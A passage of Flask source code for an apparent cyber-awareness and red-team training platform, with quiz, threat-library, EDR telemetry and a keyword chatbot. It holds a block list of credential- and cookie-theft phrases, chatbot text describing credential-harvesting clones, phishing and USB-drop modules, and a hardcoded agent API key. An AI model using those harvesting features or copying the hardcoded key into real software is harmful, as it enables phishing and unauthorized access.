    prev = request.form.get("prev", "").strip()
    is_published = 1 if request.form.get("is_published") == "on" else 0

    if not name or not desc or not how or not prev:
        flash("Please fill all required fields.", "danger")
        return redirect(url_for("admin_threats"))

    conn = get_db()
    conn.execute("""
        UPDATE cyber_threats
        SET name = ?, risk = ?, desc = ?, how = ?, prev = ?, is_published = ?, updated_at = CURRENT_TIMESTAMP
        WHERE id = ?
    """, (name, risk, desc, how, prev, is_published, threat_id))
    conn.commit()
    conn.close()

    flash("Threat updated successfully.", "success")
    return redirect(url_for("admin_threats"))


@app.route("/admin/threats/<int:threat_id>/delete", methods=["POST"])
@admin_required
def delete_threat(threat_id):
    conn = get_db()
    conn.execute("DELETE FROM cyber_threats WHERE id = ?", (threat_id,))
    conn.commit()
    conn.close()

    flash("Threat deleted successfully.", "success")
    return redirect(url_for("admin_threats"))


@app.route("/quiz")
def quiz_start():
    ensure_quiz_table()
    return render_template("quiz_start.html")

@app.route("/quiz/start", methods=["POST"])
@login_required
def quiz_start_post():
    conn = get_db()
    user = conn.execute("SELECT full_name, username FROM users WHERE id = ?", (session.get("user_id"),)).fetchone()
    conn.close()

    name = user["full_name"] if user and user["full_name"] else user["username"]
    session_id = str(uuid.uuid4())[:8]
    return redirect(url_for("quiz_take", session_id=session_id, name=name))

@app.route("/quiz/take/<session_id>", methods=["GET", "POST"])
@login_required
def quiz_take(session_id):
    ensure_quiz_table()
    ensure_quiz_questions_table()
    name = request.args.get("name", "Anonymous")
    
    conn = get_db()
    rows = conn.execute("SELECT * FROM quiz_questions WHERE is_active = 1 ORDER BY id ASC").fetchall()
    conn.close()

    questions = []
    if rows:
        for r in rows:
            questions.append({
                "id": r["id"],
                "q": r["question"],
                "a": [r["option_a"], r["option_b"], r["option_c"], r["option_d"]],
                "correct": r["correct_option"]
            })
    else:
        questions = QUIZ_QUESTIONS

    if request.method == "POST":
        score = 0
        total = len(questions)
        for q in questions:
            ans = request.form.get(f"q{q['id']}")
            if ans is not None and int(ans) == q["correct"]: score += 1
        percentage = int((score / total) * 100) if total else 0
        status = "Cyber Awareness Passed" if percentage >= 70 else "Needs More Training"

        conn = get_db()
        conn.execute(
            """INSERT INTO quiz_results 
            (student_name, score, total, percentage, status, timestamp, user_id) 
            VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (name, score, total, percentage, status, now(), session.get("user_id"))
        )
        conn.commit()
        conn.close()
        return render_template("quiz_result.html", name=name, score=score, total=total, percentage=percentage, status=status)

    return render_template("quiz_take.html", name=name, questions=questions)

@app.route("/quiz-admin")
@admin_required
def quiz_admin():
    ensure_quiz_table()
    conn = get_db()
    rows = conn.execute("SELECT * FROM quiz_results ORDER BY id DESC").fetchall()
    conn.close()
    return render_template("quiz_admin.html", rows=rows)

@app.route("/quiz-builder")
@admin_required
def quiz_builder():
    ensure_quiz_questions_table()
    conn = get_db()
    questions = conn.execute("SELECT * FROM quiz_questions ORDER BY id DESC").fetchall()
    conn.close()
    return render_template("quiz_builder.html", questions=questions)

@app.route("/quiz-builder/add", methods=["POST"])
@admin_required
def quiz_builder_add():
    ensure_quiz_questions_table()
    question = request.form.get("question", "").strip()
    option_a = request.form.get("option_a", "").strip()
    option_b = request.form.get("option_b", "").strip()
    option_c = request.form.get("option_c", "").strip()
    option_d = request.form.get("option_d", "").strip()
    correct_option = int(request.form.get("correct_option", "0"))

    conn = get_db()
    conn.execute("INSERT INTO quiz_questions (question, option_a, option_b, option_c, option_d, correct_option, is_active, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 (question, option_a, option_b, option_c, option_d, correct_option, 1, now()))
    conn.commit()
    conn.close()
    return redirect(url_for("quiz_builder"))

@app.route("/quiz-builder/delete/<int:q_id>", methods=["POST"])
@admin_required
def quiz_builder_delete(q_id):
    ensure_quiz_questions_table()
    conn = get_db()
    conn.execute("DELETE FROM quiz_questions WHERE id = ?", (q_id,))
    conn.commit()
    conn.close()
    return redirect(url_for("quiz_builder"))

@app.route("/quiz-builder/toggle/<int:q_id>", methods=["POST"])
@admin_required
def quiz_builder_toggle(q_id):
    ensure_quiz_questions_table()
    conn = get_db()
    row = conn.execute("SELECT is_active FROM quiz_questions WHERE id = ?", (q_id,)).fetchone()
    if row:
        new_status = 0 if row["is_active"] == 1 else 1
        conn.execute("UPDATE quiz_questions SET is_active = ? WHERE id = ?", (new_status, q_id))
    conn.commit()
    conn.close()
    return redirect(url_for("quiz_builder"))

@app.route('/quiz/result/<int:quiz_id>')
@login_required
def view_quiz_result(quiz_id):
    """مسار لعرض نتيجة امتحان سابقة أو طباعة الشهادة"""
    conn = get_db()
    # جلب نتيجة الامتحان بناءً على الـ ID
    result = conn.execute("SELECT * FROM quiz_results WHERE id = ?", (quiz_id,)).fetchone()
    conn.close()

    # إذا لم تكن النتيجة موجودة
    if not result:
        flash("نتيجة الامتحان غير موجودة.", "danger")
        return redirect(url_for('profile'))

    # حماية أمنية: التأكد أن من يعرض النتيجة هو صاحبها أو الآدمن
    if session.get("role") != "admin" and result["user_id"] != session.get("user_id"):
        flash("غير مصرح لك بعرض هذه الشهادة.", "danger")
        return redirect(url_for('profile'))

    # إرسال البيانات لصفحة الشهادة
    return render_template(
        "quiz_result.html",
        name=result["student_name"],
        score=result["score"],
        total=result["total"],
        percentage=result["percentage"],
        status=result["status"],
        timestamp=result["timestamp"]
    )
# ==================== DATA & REPORTING ====================

@app.route("/api/chart-data")
@admin_required
def chart_data():
    conn = get_db()
    scans = conn.execute("SELECT substr(timestamp, 1, 10) day, COUNT(*) count FROM scan_history GROUP BY day ORDER BY day").fetchall()
    attempts = conn.execute("SELECT substr(timestamp, 1, 10) day, COUNT(*) count FROM captured_data GROUP BY day ORDER BY day").fetchall()
    ssl_count = conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='ssl'").fetchone()[0]
    file_count = conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='file'").fetchone()[0]
    conn.close()
    return jsonify({"scans_per_day": [dict(x) for x in scans], "attempts_per_day": [dict(x) for x in attempts], "ssl_checks": ssl_count, "file_analysis": file_count})

@app.route("/reports")
@admin_required
def reports():
    ensure_quiz_table()
    conn = get_db()
    stats = {
        "scans": conn.execute("SELECT COUNT(*) FROM scan_history").fetchone()[0],
        "files": conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='file'").fetchone()[0],
        "training": conn.execute("SELECT COUNT(*) FROM captured_data").fetchone()[0],
        "clones": conn.execute("SELECT COUNT(*) FROM clones").fetchone()[0],
        "quiz": conn.execute("SELECT COUNT(*) FROM quiz_results").fetchone()[0],
        "ssl": conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='ssl'").fetchone()[0],
        "website": conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='website'").fetchone()[0],
        "email": conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='email'").fetchone()[0],
        "url": conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='url'").fetchone()[0],
    }
    recent_scans = conn.execute("SELECT * FROM scan_history ORDER BY id DESC LIMIT 10").fetchall()
    recent_quiz = conn.execute("SELECT * FROM quiz_results ORDER BY id DESC LIMIT 10").fetchall()
    conn.close()
    return render_template("reports.html", stats=stats, recent_scans=recent_scans, recent_quiz=recent_quiz)


# ==================== REMOTE AGENT & MINI-SOC ROUTES ====================

@app.route('/api/agent/heartbeat', methods=['POST'])
def agent_heartbeat():
    data = request.get_json()
    if not data or data.get('api_key') != 'SET-CDP-AGENT-KEY':
        return jsonify({'error': 'Unauthorized'}), 401
    
    agent_id = data.get('agent_id')
    hostname = data.get('hostname')
    username = data.get('username')
    os_name = data.get('os_name')
    local_ip = data.get('local_ip')
    cpu_percent = data.get('cpu_percent')
    ram_percent = data.get('ram_percent')
    
    # تحويل المصفوفات إلى نصوص JSON لحفظها في قاعدة البيانات
    processes_data = json.dumps(data.get('processes', []))
    connections_data = json.dumps(data.get('connections', []))
    
    conn = get_db()
    existing = conn.execute("SELECT id FROM edr_agents WHERE agent_id = ?", (agent_id,)).fetchone()
    
    if existing:
        conn.execute("""
            UPDATE edr_agents 
            SET hostname=?, username=?, os_name=?, local_ip=?, cpu_percent=?, ram_percent=?, 
                processes_data=?, connections_data=?, status='Online', last_seen=?
            WHERE agent_id=?
        """, (hostname, username, os_name, local_ip, cpu_percent, ram_percent, 
              processes_data, connections_data, now(), agent_id))
    else:
        conn.execute("""
            INSERT INTO edr_agents (agent_id, hostname, username, os_name, local_ip, cpu_percent, ram_percent, processes_data, connections_data, status, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'Online', ?)
        """, (agent_id, hostname, username, os_name, local_ip, cpu_percent, ram_percent, processes_data, connections_data, now()))
        
    conn.commit()
    conn.close()
    return jsonify({'success': True, 'message': 'Heartbeat received'})

@app.route("/edr/devices")
@admin_required
def edr_devices():
    conn = get_db()
    agents_db = conn.execute("SELECT * FROM edr_agents ORDER BY last_seen DESC").fetchall()
    conn.close()

    devices = []
    current_time = datetime.now()

    for row in agents_db:
        dev = dict(row)
        try:
            last_seen_dt = datetime.strptime(dev['last_seen'], "%Y-%m-%d %H:%M:%S")
            diff_seconds = (current_time - last_seen_dt).total_seconds()
            if diff_seconds > 30:
                dev['status'] = 'Offline'
            else:
                dev['status'] = 'Online'
        except Exception:
            dev['status'] = 'Unknown'
        devices.append(dev)

    return render_template("edr_devices.html", devices=devices)

@app.route("/edr/device/<agent_id>")
@admin_required
def edr_device_details(agent_id):
    conn = get_db()
    dev_row = conn.execute("SELECT * FROM edr_agents WHERE agent_id = ?", (agent_id,)).fetchone()
    conn.close()
    
    if not dev_row:
        flash("الجهاز غير موجود أو لم يتم تسجيله بعد.", "danger")
        return redirect(url_for('edr_devices'))
        
    dev = dict(dev_row)
    
    # تحديد حالة الـ Offline
    try:
        last_seen_dt = datetime.strptime(dev['last_seen'], "%Y-%m-%d %H:%M:%S")
        diff_seconds = (datetime.now() - last_seen_dt).total_seconds()
        dev['status'] = 'Offline' if diff_seconds > 30 else 'Online'
    except Exception:
        dev['status'] = 'Unknown'
        
    # استخراج وتحليل بيانات العمليات
    dev['processes'] = []
    if dev.get('processes_data'):
        try:
            procs = json.loads(dev['processes_data'])
            for p in procs:
                risk = get_process_risk(p) # استخدام دالة تقييم المخاطر
                p.update({"risk_score": risk["score"], "risk_level": risk["level"], "risk_reasons": risk["reasons"]})
                dev['processes'].append(p)
        except Exception: pass

    # استخراج وتحليل بيانات الاتصالات الشبكية
    dev['connections'] = []
    if dev.get('connections_data'):
        try:
            conns = json.loads(dev['connections_data'])
            for c in conns:
                risk = get_connection_risk(c) # استخدام دالة تقييم المخاطر
                c.update({"risk_score": risk["score"], "risk_level": risk["level"], "risk_reasons": risk["reasons"]})
                dev['connections'].append(c)
        except Exception: pass

    return render_template("edr_device_details.html", device=dev)

@app.route("/edr/download")
@admin_required
def agent_download():
    return render_template("agent_download.html")

# ==================== LOCAL EDR (SERVER MONITOR) ====================
@app.route("/edr")
@login_required
def edr_dashboard():
    return render_template("edr.html")

@app.route("/api/edr-data")
@login_required
def api_edr_data():
    processes = []; connections = []; alerts = []
    try:
        system_info = {
            "hostname": socket.gethostname(), "platform": platform.platform(),
            "cpu_percent": psutil.cpu_percent(interval=0.2), "memory_percent": psutil.virtual_memory().percent,
            "disk_percent": psutil.disk_usage("/").percent,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    except Exception: system_info = {}

    try:
        for proc in psutil.process_iter(["pid", "name", "username", "status", "cpu_percent", "memory_percent", "exe", "create_time"]):
            try:
                info = proc.info
                risk = get_process_risk(info)
                process_item = {
                    "pid": info.get("pid"), "name": info.get("name") or "-", "username": info.get("username") or "-",
                    "status": info.get("status") or "-", "cpu_percent": round(info.get("cpu_percent") or 0, 1),
                    "memory_percent": round(info.get("memory_percent") or 0, 1), "exe": info.get("exe") or "-",
                    "risk_score": risk["score"], "risk_level": risk["level"], "risk_reasons": risk["reasons"]
                }
                processes.append(process_item)
                if risk["level"] in ["High", "Medium"]:
                    alerts.append({"type": "process", "severity": risk["level"], "title": f"Suspicious process: {process_item['name']}", "details": ", ".join(risk["reasons"]), "pid": process_item["pid"]})
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess): continue
        processes = sorted(processes, key=lambda p: (p["risk_score"], p["memory_percent"], p["cpu_percent"]), reverse=True)[:25]
    except Exception: pass

    try:
        for conn in psutil.net_connections(kind="inet"):
            try:
                local_address = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "-"
                remote_address = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "-"
                process_name = "-"
                if conn.pid:
                    try: process_name = psutil.Process(conn.pid).name()
                    except Exception: process_name = "-"
                
                conn_item = {
                    "type": conn.type.name if hasattr(conn.type, "name") else str(conn.type),
                    "local_address": local_address, "remote_address": remote_address,
                    "remote_ip": conn.raddr.ip if conn.raddr else None, "remote_port": conn.raddr.port if conn.raddr else None,
                    "status": conn.status, "pid": conn.pid, "process_name": process_name
                }
                risk = get_connection_risk(conn_item)
                conn_item.update({"risk_score": risk["score"], "risk_level": risk["level"], "risk_reasons": risk["reasons"]})
                if conn.status in ["ESTABLISHED", "LISTEN"]: connections.append(conn_item)
                if risk["level"] in ["High", "Medium"]:
                    alerts.append({"type": "connection", "severity": risk["level"], "title": f"Suspicious connection: {remote_address}", "details": ", ".join(risk["reasons"]), "pid": conn.pid})
            except Exception: continue
        connections = sorted(connections, key=lambda c: c["risk_score"], reverse=True)[:50]
    except Exception: pass

    return jsonify({"system": system_info, "processes": processes, "connections": connections, "alerts": alerts[:15]})

@app.route("/api/edr-kill/<int:pid>", methods=["POST"])
@admin_required
def api_edr_kill(pid):
    try:
        proc = psutil.Process(pid)
        name = (proc.name() or "").lower()
        if name in EDR_CRITICAL_PROCESS_NAMES: return jsonify({"ok": False, "error": f"Protected process cannot be killed: {name}"}), 400
        proc.terminate()
        return jsonify({"ok": True, "message": f"Process {pid} terminated successfully"})
    except psutil.NoSuchProcess: return jsonify({"ok": False, "error": "Process not found"}), 404
    except psutil.AccessDenied: return jsonify({"ok": False, "error": "Access denied."}), 403
    except Exception as e: return jsonify({"ok": False, "error": str(e)}), 500


# =========================================================
# SET-CDP Tactical Ops AI (Chatbot API) - Advanced Arsenal Version
# =========================================================

import time
import re
from flask import request, jsonify

# Rate limit لحماية الـ Endpoint من الاستعلامات المفرطة (DDoS/Spam Prevention)
CHATBOT_RATE_LIMIT = {}
CHATBOT_MAX_REQUESTS = 20      # عدد الطلبات المسموحة
CHATBOT_WINDOW_SECONDS = 60    # خلال نافذة زمنية (60 ثانية)


def normalize_chat_text(text):
    """
    تطبيع النصوص العربية والإنجليزية لتسهيل مطابقة الكلمات المفتاحية (Keyword Extraction).
    """
    text = (text or "").strip().lower()

    replacements = {
        "أ": "ا", "إ": "ا", "آ": "ا", "ى": "ي",
        "ة": "ه", "ؤ": "و", "ئ": "ي", "ـ": "",
    }

    for old, new in replacements.items():
        text = text.replace(old, new)

    text = re.sub(r"\s+", " ", text)
    return text


def has_any(text, words):
    return any(word in text for word in words)


def make_reply(reply, category="general", suggestions=None, quick_links=None):
    """
    بناء حزمة الاستجابة (Response Payload) للواجهة الأمامية.
    """
    return {
        "reply": reply,
        "category": category,
        "suggestions": suggestions or [],
        "quick_links": quick_links or []
    }


def is_rate_limited(client_ip):
    """
    نظام تقييد الطلبات (Rate Limiting) في الذاكرة.
    """
    now_ts = time.time()
    records = CHATBOT_RATE_LIMIT.get(client_ip, [])
    records = [t for t in records if now_ts - t < CHATBOT_WINDOW_SECONDS]

    if len(records) >= CHATBOT_MAX_REQUESTS:
        CHATBOT_RATE_LIMIT[client_ip] = records
        return True

    records.append(now_ts)
    CHATBOT_RATE_LIMIT[client_ip] = records
    return False


def is_unsafe_chat_request(msg):
    """
    قواعد الاشتباك (Rules of Engagement - ROE).
    حظر الاستعلامات التي تطلب أدوات اختراق فعلية غير مصرح بها.
    """
    unsafe_phrases = [
        # Arabic unsafe intent
        "كيف اسرق", "اريد اسرق", "بدي اسرق", "سرقه حساب", "سرقة حساب",
        "سرقه كلمه مرور", "سرقة كلمة مرور", "سرقه باسورد", "سرقة باسورد",
        "اختراق حساب", "تهكير حساب", "اختراق فيسبوك", "تهكير فيسبوك",
        "اختراق انستغرام", "تهكير انستغرام", "اختراق انستا",
        "سرقه كوكيز", "سرقة كوكيز", "سرقه الجلسه", "سرقة الجلسة",
        "خطف الجلسه", "خطف الجلسة", "كيف اخذ باسورد", "كيف اطلع باسورد",
        "كيف اسحب باسورد", "كيف اخذ كلمه المرور", "كلمه مرور حقيقيه",
        "باسورد حقيقي", "جمع كلمات مرور", "التقاط كلمات مرور", "صيد كلمات مرور",

        # English unsafe intent
        "steal password", "steal passwords", "steal cookies", "cookie theft",
        "session hijack", "session hijacking", "hack facebook", "hack instagram",
        "phishing real", "real phishing", "credential stealing", "credential theft",
        "password grabber", "cookie grabber", "token stealer", "steal session", "account hacking",
    ]
    return has_any(msg, unsafe_phrases)


def chatbot_reply(user_message):
    msg = normalize_chat_text(user_message)

    if not msg:
        return make_reply(
            "[SYS_READY] أدخل استعلامك. يمكنني توجيهك لاستخدام ترسانة SET-CDP الهجومية والدفاعية.",
            "general",
            suggestions=[
                "ما هي SET-CDP؟",
                "كيف أستطلع هدفاً؟",
                "كيف أنشر فخ اختراق؟",
                "ما هو Mini-SOC؟"
            ]
        )

    # =====================================================
    # Ethical Guardrail (ROE Compliance)
    # =====================================================
    if is_unsafe_chat_request(msg):
        return make_reply(
            (
                "[تحذير أمني] طلبك ينتهك قواعد الاشتباك (Rules of Engagement). "
                "ترسانة SET-CDP مصممة لمحاكاة التهديدات (Adversary Simulation) والتحليل الدفاعي (Blue Teaming) في البيئات المصرح بها فقط. "
                "لن يتم تقديم أي مساعدة لتنفيذ هجمات غير قانونية. يمكنني بدلاً من ذلك توجيهك لطرق تأمين الأنظمة واكتشاف الثغرات."
            ),
            "safety",
            suggestions=[
                "كيف يتم كشف التصيد؟",
                "كيف أحمي الجلسات (Sessions)؟",
                "ما هي المصادقة الثنائية (MFA)؟"
            ]
        )

    # =====================================================
    # Greetings
    # =====================================================
    if has_any(msg, ["مرحبا", "اهلا", "السلام عليكم", "هاي", "hello", "hi", "مسموع"]):
        return make_reply(
            (
                "[SECURE_CHANNEL_ESTABLISHED] تم تأمين الاتصال. أنا الموجه التكتيكي لترسانة SET-CDP (Ops AI). "
                "جاهز لتزويدك بالمعلومات الاستخباراتية حول أدوات الاستطلاع (Recon)، المحاكاة الهجومية (Red Teaming)، أو مراقبة التهديدات (SOC)."
            ),
            "greeting",
            suggestions=[
                "ما هي أدوات الاستطلاع؟",
                "كيف أنفذ هجوم محاكاة؟",
                "ما هو الـ Endpoint Agent؟"
            ]
        )

    # =====================================================
    # About SET-CDP
    # =====================================================
    if has_any(msg, ["ما هي set", "ما هي المنصه", "شو هي المنصه", "set-cdp", "عن المشروع", "من نحن", "فكره المشروع"]):
        return make_reply(
            (
                "SET-CDP هي ترسانة عمليات سيبرانية (Cyber Operations Platform) تدمج التكتيكات الهجومية (Red Teaming) "
                "بأدوات التحليل الدفاعي (Blue Teaming) والمراقبة الحية (Mini-SOC). "
                "الهدف الاستراتيجي منها هو تقييم الجاهزية الأمنية وتدريب الكوادر عبر محاكاة التهديدات في بيئة معزولة."
            ),
            "about",
            quick_links=[
                {"title": "عقيدة النظام (CONOPS)", "url": "/about"},
                {"title": "مسرح العمليات", "url": "/attack"},
                {"title": "ترسانة الاستطلاع", "url": "/"}
            ]
        )

    # =====================================================
    # Tools Overview (Blue Team Arsenal)
    # =====================================================
    if has_any(msg, ["ادوات", "الادوات", "الفحص", "فحص", "scanner", "tools", "شو الادوات", "استطلاع", "recon"]):
        return make_reply(
            (
                "ترسانة الاستطلاع (Blue Teaming Arsenal) في SET-CDP تشمل: "
                "Target Recon (لفحص البنية التحتية)، Crypto Interceptor (لتحليل الـ SSL)، "
                "SocEng Payload Extractor (لتحليل التصيد)، Malware Forensics Sandbox (للهندسة العكسية للملفات)، "
                "و Obfuscation Tracer (لتتبع الروابط المخفية)."
            ),
            "tools",
            suggestions=[
                "كيف أحلل ملفاً مشبوهاً؟",
                "ما هو Crypto Interceptor؟",
                "كيف أتتبع رابط تمويه؟"
            ],
            quick_links=[
                {"title": "فتح ترسانة الاستطلاع", "url": "/"}
            ]
        )

    # =====================================================
    # Website Security Scanner (Recon)
    # =====================================================
    if has_any(msg, ["website scanner", "website security", "فحص موقع", "فحص الموقع", "تقييم موقع", "target recon", "بنية تحتية"]):
        return make_reply(
            (
                "أداة Target Recon & Vuln Scanner تنفذ استطلاعاً نشطاً للبنية التحتية، تفحص استخدام بروتوكولات التشفير، "
                "وتكشف غياب هيدرز الحماية الأساسية، ثم تصدر تقييم لسطح الهجوم (Attack Surface) الخاص بالهدف."
            ),
            "website_scanner",
            quick_links=[{"title": "ترسانة الاستطلاع", "url": "/"}]
        )

    # =====================================================
    # SSL (Crypto Interceptor)
    # =====================================================
    if has_any(msg, ["ssl", "شهاده", "شهادة", "https", "certificate", "cert", "crypto", "تشفير", "اعتراض"]):
        return make_reply(
            (
                "وحدة Crypto/SSL Interceptor تحلل قناة التشفير للهدف، تكشف ضعف البروتوكولات المستخدمة (مثل TLSv1 القديم)، "
                "وتحدد قابلية الهدف للاختراق عبر هجمات الرجل في المنتصف (MITM)."
            ),
            "ssl",
            suggestions=["ما هو محلل الهيدرز؟", "كيف أفحص رابط؟"]
        )

    # =====================================================
    # Header Analyzer (Exploit Surface)
    # =====================================================
    if has_any(msg, ["header", "headers", "الهيدر", "الهيدرز", "csp", "hsts", "x-frame", "exploit surface"]):
        return make_reply(
            (
                "محلل سطح الاستغلال (Server Exploit Surface Analyzer) يكتشف غياب السياسات الأمنية (Security Headers) "
                "مثل CSP و HSTS، وهو ما يسهل على المهاجمين تنفيذ هجمات حقن السكربتات (XSS) والـ Clickjacking."
            ),
            "headers",
            quick_links=[{"title": "ترسانة الاستطلاع", "url": "/"}]
        )

    # =====================================================
    # URL Safety (Threat Intel)
    # =====================================================
    if has_any(msg, ["رابط", "url", "لينك", "مشبوه", "تصيد", "phishing", "رابط مشبوه", "threat intel"]):
        return make_reply(
            (
                "أداة Threat Intel URL Scanner تنفذ استطلاعاً سلبياً (OSINT) على الروابط. "
                "تبحث عن أساليب التمويه (Obfuscation)، انتحال النطاقات عبر الـ Punycode، وإخفاء مسار الخادم خلف IPs عارية."
            ),
            "url",
            suggestions=["كيف أتتبع التحويلات؟", "كيف أستخرج الحمولات؟"],
            quick_links=[{"title": "تحليل الروابط", "url": "/"}]
        )

    # =====================================================
    # URL Expander (Traceroute)
    # =====================================================
    if has_any(msg, ["short url", "shortener", "رابط مختصر", "روابط مختصره", "url expander", "bit.ly", "tinyurl", "فك الرابط", "تتبع", "trace"]):
        return make_reply(
            (
                "أداة Obfuscation Tracer تتتبع سلاسل التحويل (Redirect Chains) التي يستخدمها المهاجمون لإخفاء "
                "الوجهة النهائية (Payload Destination). تتيح لك كشف الخادم الحقيقي خلف الروابط المختصرة."
            ),
            "url_expander"
        )

    # =====================================================
    # Password Analyzer / Generator (Brute-Force & Keygen)
    # =====================================================
    if has_any(msg, ["كلمه مرور", "كلمة مرور", "باسورد", "password", "قويه", "قوية", "مولد", "generator", "brute force", "تخمين", "مفتاح"]):
        return make_reply(
            (
                "وحدة Brute-Force Strength Tester تحلل مقاومة المفاتيح وكلمات المرور لهجمات التخمين وقواميس الاختراق. "
                "بينما تتيح لك أداة Cryptographic Key Generator توليد مفاتيح تشفير محصنة (بأطوال تصل لـ 64-bit) محلياً لحماية أنظمتك."
            ),
            "password"
        )

    # =====================================================
    # File Hash / Metadata (Forensics)
    # =====================================================
    if has_any(msg, ["ملف", "hash", "sha", "sha-256", "هاش", "metadata", "pdf", "صوره", "صورة", "file", "forensics", "هندسة عكسية", "malware", "خبيث"]):
        return make_reply(
            (
                "منصة Malware Forensics Sandbox تقوم بهندسة عكسية مصغرة (Static Analysis). "
                "تستخرج البصمات (Hashes)، الميتاداتا العميقة، وقيم الانتروبي (Entropy) لكشف البرمجيات الخبيثة المدمجة (Packed Malware) داخل الملفات."
            ),
            "file"
        )

    # =====================================================
    # Email Phishing (Payload Extractor)
    # =====================================================
    if has_any(msg, ["ايميل", "email", "رساله", "رسالة", "بريد", "phishing email", "بريد مشبوه", "soceng", "هندسة اجتماعية"]):
        return make_reply(
            (
                "مستخرج حمولات الهندسة الاجتماعية (SocEng Payload Extractor) يحلل رسائل التصيد "
                "لاستخراج مؤشرات الاختراق (IOCs) والتكتيكات النفسية المستخدمة، وتحديد الروابط الملغمة (Weaponized Links)."
            ),
            "email"
        )

    # =====================================================
    # Mini-EDR / SOC
    # =====================================================
    if has_any(msg, ["edr", "soc", "mini-edr", "mini soc", "monitor", "مراقبه", "مراقبة", "live soc", "مركز عمليات"]):
        return make_reply(
            (
                "لوحة C2 & Mini-SOC هي مركز عمليات مصغر. تعرض القياسات الحية (Telemetry) من الأجهزة الطرفية، "
                "وترصد الاتصالات الشبكية العكسية (Reverse Connections) والعمليات المريبة لتنفيذ صيد التهديدات (Threat Hunting)."
            ),
            "edr",
            quick_links=[
                {"title": "لوحة المراقبة (SOC)", "url": "/edr"},
                {"title": "الأجهزة المرتبطة", "url": "/edr/devices"}
            ]
        )

    # =====================================================
    # Endpoint Agent / Devices
    # =====================================================
    if has_any(msg, ["agent", "عميل", "endpoint", "جهاز", "اجهزه", "أجهزة", "devices", "تحميل agent", "heartbeat", "beacon"]):
        return make_reply(
            (
                "الـ Endpoint Agent هو برنامج (يعمل كـ Beacon) يُنشر في الأجهزة المصرح بها. "
                "يفتح قناة اتصال لإرسال نبضات (Heartbeats) متضمنة بيانات النظام والموارد والشبكة إلى خادم القيادة والسيطرة (C2)."
            ),
            "agent",
            quick_links=[
                {"title": "إدارة الأجهزة", "url": "/edr/devices"},
                {"title": "تحميل Agent", "url": "/edr/download"}
            ]
        )

    # =====================================================
    # Browser Extensions (Plugins)
    # =====================================================
    if has_any(msg, ["extension", "extensions", "اضافه", "إضافة", "اضافات", "إضافات", "متصفح", "browser", "plugins"]):
        return make_reply(
            (
                "إضافات المتصفح (Cyber Plugins) توفر طبقة حماية استباقية. "
                "مثل WebShield لحظر النطاقات الخبيثة، CookieShield لتأمين الجلسات، و AdShield لحجب التتبع وعرقلة هجمات حقن الإعلانات."
            ),
            "extensions",
            quick_links=[{"title": "متجر الإضافات", "url": "/extensions"}]
        )

    # =====================================================
    # Red Teaming / Attack / Simulation
    # =====================================================
    if has_any(msg, ["attack", "هجوم", "محاكاة", "استنساخ", "clone", "تصيد", "phishing", "usb drop", "quishing"]):
        return make_reply(
            (
                "مسرح العمليات (Red Team Module) يوفر أدوات متقدمة: "
                "1. Credential Harvesting (لاستنساخ الأهداف). "
                "2. SocEng Payloads (قوالب تصيد جاهزة). "
                "3. Quishing (توليد QR ملغم). "
                "4. USB Drop (إنشاء ملفات تنفيذية للاختراق المادي)."
            ),
            "red_team",
            quick_links=[{"title": "مسرح العمليات", "url": "/attack"}]
        )

    # =====================================================
    # Quiz / Readiness
    # =====================================================
    if has_any(msg, ["امتحان", "quiz", "اختبار", "اسئله", "أسئلة", "نتائج", "جاهزية", "readiness"]):
        return make_reply(
            (
                "اختبار الجاهزية (Readiness Quiz) يقيس مستوى الوعي الأمني للكادر البشري. "
                "يتضمن محاكاة لأسئلة تقيم قدرتهم على كشف هجمات الهندسة الاجتماعية وحماية الأصول الرقمية."
            ),
            "quiz",
            quick_links=[{"title": "بدء التقييم", "url": "/quiz"}]
        )

    # =====================================================
    # Dashboard / Reports
    # =====================================================
    if has_any(msg, ["dashboard", "لوحه التحكم", "لوحة التحكم", "تقارير", "reports", "سجل", "history", "scans", "c2"]):
        return make_reply(
            (
                "لوحة القيادة (C2 Dashboard) تعرض سجل العمليات (Op Logs) وأهداف المحاكاة النشطة. "
                "بينما يقوم مركز التقارير (Reports Center) بإنشاء ملخص تنفيذي وإحصاءات حية للأنشطة الهجومية والدفاعية المنجزة."
            ),
            "dashboard",
            quick_links=[
                {"title": "C2 Dashboard", "url": "/dashboard"},
                {"title": "تقارير العمليات", "url": "/reports"}
            ]
        )

    # =====================================================
    # Threat Library (Intel)
    # =====================================================
    if has_any(msg, ["مكتبه التهديدات", "مكتبة التهديدات", "threat", "threat library", "تهديدات", "مخاطر", "intel"]):
        return make_reply(
            (
                "مكتبة التهديدات (Threat Intel Database) هي قاعدة استخباراتية تفصل التكتيكات والتقنيات والإجراءات (TTPs) "
                "الخاصة بالمهاجمين، وتوفر أساليب التصدي الاستباقية للحد من المخاطر."
            ),
            "threat_library",
            quick_links=[{"title": "قاعدة الاستخبارات (Threat Intel)", "url": "/threat-library"}]
        )

    # =====================================================
    # Privacy / ROE
    # =====================================================
    if has_any(msg, ["خصوصيه", "خصوصية", "اخلاقي", "أخلاقي", "ethics", "privacy", "امان البيانات", "roe", "قواعد الاشتباك"]):
        return make_reply(
            (
                "[ROE ALERT] منصة SET-CDP تلتزم بقواعد اشتباك صارمة. الاستخدام مقتصر على التقييم האكاديمي (Authorized Simulation). "
                "يمنع استهداف أنظمة أو مستخدمين خارج نطاق الاختبار. جميع الأنشطة تخضع لتدقيق الإدارة."
            ),
            "privacy_ethics"
        )

    # =====================================================
    # Run / Install / GitHub
    # =====================================================
    if has_any(msg, ["تشغيل", "run", "github", "تثبيت", "install", "flask", "requirements", "python app", "setup"]):
        return make_reply(
            (
                "[DEPLOYMENT] لنشر الترسانة: 1. ثبّت المكتبات من requirements.txt. 2. أطلق خادم القيادة عبر `python app.py`. "
